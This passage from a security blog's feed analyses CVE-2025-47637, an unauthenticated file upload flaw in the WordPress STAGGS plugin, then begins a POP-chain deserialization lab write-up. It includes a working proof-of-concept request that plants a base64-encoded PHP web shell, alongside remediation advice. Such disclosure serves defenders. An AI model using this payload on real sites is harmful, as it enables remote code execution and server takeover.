.018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registered an action hook for unauthenticated users (&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_staggs_get_configuration_form_urls&amp;#39;, &amp;#39;staggs_get_configuration_form_urls_ajax&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When accessing the endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with param &lt;code&gt;action=staggs_get_configuration_form_urls&lt;/code&gt; the callback &lt;code&gt;staggs_get_configuration_form_urls_ajax&lt;/code&gt; is called&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function staggs_get_configuration_form_urls_ajax() {&#xA;  $response = array();&#xA;  if ( ! isset( $_POST[&amp;#39;nonce&amp;#39;] ) || ! wp_verify_nonce( $_REQUEST[&amp;#39;nonce&amp;#39;], &amp;#39;sgg_ajax_nonce&amp;#39; ) ) {&#xA;    echo json_encode( $response );&#xA;    die();&#xA;  }&#xA;  ...&#xA;  if ( isset( $_POST[&amp;#39;image_id&amp;#39;] ) ) {&#xA;    $image_name = staggs_sanitize_title( get_the_title( $_POST[&amp;#39;image_id&amp;#39;] ) ); // image name based on product title.&#xA;    $image_url  = store_final_product_image( $image_name, $_POST[&amp;#39;image&amp;#39;], $_POST[&amp;#39;values&amp;#39;], true );&#xA;&#xA;    $response[&amp;#39;image_url&amp;#39;] = $image_url;&#xA;  }&#xA;  ...&#xA;  echo json_encode( $response );&#xA;  die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function checks the &lt;code&gt;nonce&lt;/code&gt; from the request; if it doesn&amp;rsquo;t exist or is invalid it returns an empty response.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;When searching for the keyword &lt;code&gt;sgg_ajax_nonce&lt;/code&gt;, we see the &lt;code&gt;nonce&lt;/code&gt; is created with the key &lt;code&gt;AJAX_NONCE&lt;/code&gt; and has a comment &lt;code&gt;// image name based on product title.&lt;/code&gt; related to the product. Since this section does not require authentication, it may be a mechanism to serve product display to unauthenticated users, and the &lt;code&gt;nonce&lt;/code&gt; is inserted directly into the source code.&#xA;When testing the plugin&amp;rsquo;s product creation feature, the system creates a post that unauthenticated users can still access.&#xA;This &lt;code&gt;nonce&lt;/code&gt; appears in the returned source when accessing the created product.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/nonce_create.png&#34; title=&#34;How the nonce is created&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/nonce_create.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce Create&lt;/h2&gt;&lt;p&gt;How the nonce is created&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/nonce_create.png&#39; alt=&#34;Nonce Create&#34; height=&#34;327&#34; width=&#34;1369&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;How the nonce is created&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/product.png&#34; title=&#34;Create Product using plugin&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/product.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Product&lt;/h2&gt;&lt;p&gt;Create Product using plugin&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/product.png&#39; alt=&#34;Create Product&#34; height=&#34;685&#34; width=&#34;1039&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create Product using plugin&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/nonce.png&#34; title=&#34;Nonce taken from response&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce taken from response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;682&#34; width=&#34;1543&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce taken from response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;p&gt;If the &lt;code&gt;nonce&lt;/code&gt; is valid, it proceeds to check whether &lt;code&gt;$_POST[&#39;image_id&#39;]&lt;/code&gt; exists; if it does:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;It fetches the &lt;code&gt;image name&lt;/code&gt;, meaning the &lt;strong&gt;product title&lt;/strong&gt; (as described: &lt;code&gt;// image name based on product title.&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;Calls &lt;code&gt;store_final_product_image()&lt;/code&gt; to save the image and obtain the returned URL&lt;/li&gt;&#xA;&lt;li&gt;Returns a JSON response containing &lt;code&gt;image_url&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;function store_final_product_image( $imagename, $data, $options, $main_image = true) {&#xA;  if ( preg_match( &amp;#39;/^data:image\/(.*);base64,/&amp;#39;, $data, $type ) ) {&#xA;    // Valid base64 image.&#xA;    $data = substr( $data, strpos($data, &amp;#39;,&amp;#39;) &amp;#43; 1 );&#xA;    $type = strtolower( $type[1] ); // jpg, png, gif&#xA;&#xA;    $data = str_replace( &amp;#39; &amp;#39;, &amp;#39;&amp;#43;&amp;#39;, $data );&#xA;    $data = base64_decode($data);&#xA;  &#xA;    if ( $data === false ) {&#xA;      throw new \Exception(&amp;#39;Image decode failed. Try again.&amp;#39;);&#xA;    }&#xA;  } &#xA;  ...&#xA;  $upload_dir = wp_get_upload_dir();&#xA;  $base_dir   = $upload_dir[&amp;#39;basedir&amp;#39;];&#xA;&#xA;  // Allow different location.&#xA;  $save_path  = apply_filters( &amp;#39;staggs_image_save_dir&amp;#39;, $base_dir . &amp;#39;/staggs&amp;#39; );&#xA;  if ( ! file_exists( $save_path ) ) {&#xA;    mkdir( $save_path, 0777, true );&#xA;  }&#xA;  if ( $main_image ) {&#xA;    // Main product image.&#xA;    if ( is_array( $options ) &amp;amp;&amp;amp; count( $options ) &amp;gt; 0 ) {&#xA;      $filename = $imagename . &amp;#39;-&amp;#39; . md5( wp_json_encode( $options ) ) . &amp;#39;.&amp;#39; . $type;&#xA;    } else {&#xA;      $filename = $imagename . &amp;#39;.&amp;#39; . $type;&#xA;    }&#xA;  } &#xA;  ...&#xA;  // Always override in case something went wrong earlier&#xA;  file_put_contents( $save_path . &amp;#34;/{$filename}&amp;#34;, $data );&#xA;  $image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path );&#xA;  return $image_path_url . &amp;#34;/{$filename}&amp;#34;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The command:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;preg_match(&amp;#39;/^data:image\/(.*);base64,/&amp;#39;, $data, $type)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;is used to check whether the variable &lt;code&gt;$data&lt;/code&gt; is a &lt;strong&gt;Base64 Data URI&lt;/strong&gt; image string or not.&#xA;Specifically:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;^data:image\/&lt;/code&gt; → string must start with &lt;code&gt;data:image/&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;(.*)&lt;/code&gt; → captures the image format (e.g., &lt;code&gt;png&lt;/code&gt;, &lt;code&gt;jpeg&lt;/code&gt;, &lt;code&gt;gif&lt;/code&gt;, …)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;;base64,&lt;/code&gt; → followed by the string &lt;code&gt;;base64,&lt;/code&gt; (indicating the image data is Base64-encoded)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If it matches, the array &lt;code&gt;$type&lt;/code&gt; will contain the format info, for example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$type[1] = &amp;#39;png&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If it doesn&amp;rsquo;t match, i.e., &lt;code&gt;$data&lt;/code&gt; &lt;strong&gt;is not valid Base64 image data&lt;/strong&gt;, the function returns &lt;code&gt;0&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Then &lt;code&gt;$type&lt;/code&gt; is assigned the value of &lt;code&gt;$type[1]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;We can pass &lt;code&gt;$data=data:image/php;base64...&lt;/code&gt; so &lt;code&gt;$type[1] =&#39;php&#39;&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;if ( is_array( $options ) &amp;amp;&amp;amp; count( $options ) &amp;gt; 0 ) {&#xA;  $filename = $imagename . &amp;#39;-&amp;#39; . md5( wp_json_encode( $options ) ) . &amp;#39;.&amp;#39; . $type;&#xA;} else {&#xA;  $filename = $imagename . &amp;#39;.&amp;#39; . $type;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If &lt;code&gt;$options&lt;/code&gt; is not passed then &lt;code&gt;$filename&lt;/code&gt; will be in the form &lt;code&gt;product_title.$type&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Finally, the file is saved using &lt;code&gt;file_put_contents()&lt;/code&gt; and the URL to it is returned:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;file_put_contents( $save_path . &amp;#34;/{$filename}&amp;#34;, $data );&#xA;$image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path );&#xA;return $image_path_url . &amp;#34;/{$filename}&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls&amp;#34;] --&amp;gt; B[&amp;#34;staggs_get_configuration_form_urls_ajax()&amp;#34;]&#xA;B --&amp;gt; C{&amp;#34;wp_verify_nonce() valid?&amp;#34;}&#xA;C -- No --&amp;gt; Z[&amp;#34;Return empty JSON&amp;#34;]&#xA;C -- Yes --&amp;gt; D{&amp;#34;isset($_POST[&amp;#39;image_id&amp;#39;])?&amp;#34;}&#xA;D -- No --&amp;gt; Z&#xA;D -- Yes --&amp;gt; E[&amp;#34;store_final_product_image($image_name, $_POST[&amp;#39;image&amp;#39;], $_POST[&amp;#39;values&amp;#39;], true)&amp;#34;]&#xA;E --&amp;gt; F{&amp;#34;preg_match(&amp;#39;/^data:image/(.*);base64,/&amp;#39;, $data, $type) ?&amp;#34; }&#xA;F -- No --&amp;gt; Z&#xA;F -- Yes --&amp;gt; G[&amp;#34;$type = strtolower($type[1]); base64_decode($data)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Obtain the nonce from the returned source&lt;/li&gt;&#xA;&lt;li&gt;Send a POST request&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;action=staggs_get_configuration_form_urls&amp;amp;nonce=f281c84283&amp;amp;image_id=1&amp;amp;image=data:image/php;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg==&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With &lt;code&gt;PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg==&lt;/code&gt; being the base64 encoding of &lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;quot;cmd&amp;quot;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/request.png&#34; title=&#34;Request with Web Shell payload&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/request.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Request with Web Shell payload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/request.png&#39; alt=&#34;Request&#34; height=&#34;413&#34; width=&#34;1539&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request with Web Shell payload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Access the returned URL and achieve RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/result.png&#34; title=&#34;RCE via file upload&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE via file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/result.png&#39; alt=&#34;Result&#34; height=&#34;589&#34; width=&#34;1533&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE via file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability allows an &lt;strong&gt;unauthenticated&lt;/strong&gt; attacker to upload arbitrary files (e.g., a web shell) via the plugin&amp;rsquo;s AJAX endpoint because the file type is not validated before saving. An attacker can obtain the &lt;code&gt;nonce&lt;/code&gt; from publicly available source, send a forged &lt;code&gt;data:&lt;/code&gt; URI (e.g., &lt;code&gt;data:image/php;base64,...&lt;/code&gt;) and create a PHP file on the server, leading to RCE. The issue was fixed in version &lt;strong&gt;2.12.0&lt;/strong&gt; by restricting accepted extensions (png, jpg, jpeg, gif).&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;The vulnerability stems from &lt;strong&gt;not properly validating the file type/extension&lt;/strong&gt; before saving; client-side/regex checks are insufficient if the extension and actual content are not constrained.&lt;/li&gt;&#xA;&lt;li&gt;Do not leave important upload actions exposed as &lt;strong&gt;nopriv (unauthenticated)&lt;/strong&gt; endpoints without authentication and strict restrictions.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;nonce&lt;/code&gt; values embedded in publicly accessible source can be collected and reused — do not rely solely on publicly visible nonces to prevent sensitive actions.&lt;/li&gt;&#xA;&lt;li&gt;Validate &lt;strong&gt;MIME type&lt;/strong&gt;, &lt;strong&gt;extension&lt;/strong&gt;, and (if possible) the actual file content on the server; store uploads in non-executable locations or convert them to non-executable.&lt;/li&gt;&#xA;&lt;li&gt;Update the plugin to &lt;strong&gt;&amp;gt;= 2.12.0&lt;/strong&gt; immediately; check your site for suspicious files in the &lt;code&gt;staggs/&lt;/code&gt; upload directory if the site runs an older version.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/staggs/vulnerability/wordpress-staggs-2-10-1-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress STAGGS Plugin &amp;lt;= 2.11.0 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>POP Chain Analysis &amp; Exploit</title>
      <link>http://localhost:1313/posts/2025-11-11-pop-chain-lab1/</link>
      <pubDate>Tue, 11 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-11-pop-chain-lab1/</guid>
      <category domain="http://localhost:1313/categories/cve-analyst/">CVE Analyst</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;intro&#34;&gt;&lt;span&gt;Intro&lt;/span&gt;&#xA;  &lt;a href=&#34;#intro&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;During my research on &lt;strong&gt;Insecure Deserialization&lt;/strong&gt;, I received a lab related to &lt;strong&gt;POP Chain&lt;/strong&gt; (Property-Oriented Programming Chain). This is an interesting type of attack: instead of exploiting a function or command directly, an attacker composes &lt;em&gt;gadgets&lt;/em&gt; (magic methods from classes) to achieve a goal — for example, executing system commands (RCE).&lt;/p&gt;&#xA;&lt;p&gt;This post describes my analysis and exploitation of the lab: reviewing the source code, identifying useful gadgets, and building a payload to trigger the call chain (POP chain). The goal is to help you understand the thought process when tackling labs of this kind.&lt;/p&gt;&#xA;&lt;p&gt;The lab I worked on:&#xA;&lt;a href=&#34;https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 